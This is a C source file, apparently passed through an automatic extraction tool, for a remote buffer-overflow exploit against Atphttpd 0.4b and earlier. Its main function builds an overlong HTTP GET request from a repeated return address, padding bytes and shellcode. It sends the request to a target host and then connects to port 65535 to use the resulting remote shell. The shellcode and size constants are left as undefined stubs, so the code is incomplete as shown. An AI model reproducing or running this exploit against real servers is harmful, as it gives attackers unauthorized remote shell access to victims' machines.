#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */

/* Variables and functions */
 size_t ALIGN ; 
 unsigned long DEFAULT_OFFSET ; 
 int LEN ; 
 int PORT ; 
 unsigned long atoi (char*) ; 
 int /*<<< orphan*/  close (int) ; 
 int connect_to_host (char*,int) ; 
 int /*<<< orphan*/  exit (int) ; 
 int /*<<< orphan*/  fflush (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  perror (char*) ; 
 int /*<<< orphan*/  printf (char*,...) ; 
 scalar_t__ send (int,char*,int,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  shell (int) ; 
 char* shellcode ; 
 int /*<<< orphan*/  sleep (int) ; 
 int /*<<< orphan*/  stdout ; 
 int strlen (char*) ; 

int main(int argc,char **argv) {
	int i,sd;
	char http_req[LEN];
	unsigned long int ret=0,offset=DEFAULT_OFFSET;


	printf("(<->) Atphttpd <= 0.4b remote exploit by r-code d_fence@gmx.net\n");
	printf("(<->) Greetz to: czarny,|stachu|, Nitro, Zami, Razor, Jedlik, Cypher\n\n");
	

	if(argc<2 || argc>3){
		printf("[-] Usage: %s [host] <offset> #OFFset\n",argv[0]);
		return -1;
	}
			
	
	if(argc>2)
		offset=atoi(argv[2]);
	
	ret=0xbffffffa - offset;
	
	printf("<==> OFFSET: 0x%x\n",offset);
	printf("<==> RET_ADDR: 0x%x\n",ret);
			

	/* See comment few lines below ;] */
	
	http_req[0x00]='G';
	http_req[0x01]='E';
	http_req[0x02]='T';
	http_req[0x03]=' ';
	http_req[0x04]='/';
	
	 for(i=0x05;i<LEN;) {
		 http_req[ALIGN + i++] = (ret & 0x000000ff);
		 http_req[ALIGN + i++] = (ret & 0x0000ff00) >> 8;
		 http_req[ALIGN + i++] = (ret & 0x00ff0000) >> 16;
		 http_req[ALIGN + i++] = (ret & 0xff000000) >> 24;
	 }

	
	 for(i=0x05;i<(LEN/2);i++)
		 http_req[i]=0x41;          /* Using jump-next instruction instead of nops for a better look ;] */
	     
         for(i=0;i<strlen(shellcode);i++)
	         http_req[(LEN/2)-(strlen(shellcode)/2)+i]=shellcode[i];
		     
	 
	http_req[LEN-0x0c]=' ';
	http_req[LEN-0x0b]='H';
	http_req[LEN-0x0a]='T';
	http_req[LEN-0x09]='T';
	http_req[LEN-0x08]='P';
	http_req[LEN-0x07]='/';
	http_req[LEN-0x06]='1';
	http_req[LEN-0x05]='.';
	http_req[LEN-0x04]='1';
	http_req[LEN-0x03]=0x0d;
	http_req[LEN-0x02]=0x0a;
	http_req[LEN-0x01]=0x00;

	/* Yeah.. I know I just could strcpy/cat it ;].. but so it looks soooooo l33t ;] aint`t it ? ;) */
	
	printf("<==> Connecting to '%s' on port '%d'..\n",argv[1],PORT);
	
	if((sd=connect_to_host(argv[1],PORT))<0) {
		printf("<==> Couldn`t connect to host.. :-/\n");
		exit(1);
	}
	
	printf("<==> Sending packets..\n");
			
		
	if(send(sd,http_req,LEN,0)<0) {
		perror("<==> send(): while sending evil http request");
		return -1;
	}

	close(sd);
		
	if((sd=connect_to_host(argv[1],65535))<0) {
		printf("<==> Exploit failed..! #Probably due to a bad offset\n");
		return -1;
	}


	printf("\n### Exploit failed ");
	fflush(stdout);
	sleep(1);
	printf("... just kidding ;]\n");
	sleep(1);
	printf("### Exploit successful - enjoy your shell\n\n");
	shell(sd);
	
	return 1;
}